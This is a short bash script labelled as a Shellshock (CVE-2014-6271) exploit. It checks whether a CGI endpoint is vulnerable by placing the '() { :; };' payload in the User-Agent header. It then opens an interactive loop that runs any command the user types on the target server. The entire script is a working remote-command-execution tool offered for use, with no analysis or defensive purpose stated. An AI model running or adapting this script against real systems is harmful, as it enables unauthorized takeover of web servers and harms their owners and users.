#!/bin/bash

#########################################################################
###############_____SHELL_SHOCK EXPLOIT CVE-2014-6271_____###############
#########################################################################

clear;
if [ "$1" == "" ];then
	echo -e "#######################################\n## SHELL_SHOCK EXPLOIT CVE-2014-6271 ##\n#######################################\n"
	echo -e "Usage: $0 target cgi_vuln";
	echo -e "\t $0 192.168.1.1:8080 /cgi-bin/test.cgi"
	echo -e "\n\n By:Init-0"
	exit;
fi
POC=$(curl -s -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo vulnerable'" http://$1/$2 | grep -i "vulnerable")
if [ "$POC" != "vulnerable" ];then
echo "Target Not Vulnerable";
exit; 
fi

while true; do
	read -p "shell@shock:~# " command
	if [ "$command" == "clear" ];then
		clear;
	fi
	curl -s -H "user-agent: () { :; }; echo; echo; /bin/bash -c '$command'" http://$1/$2;
done
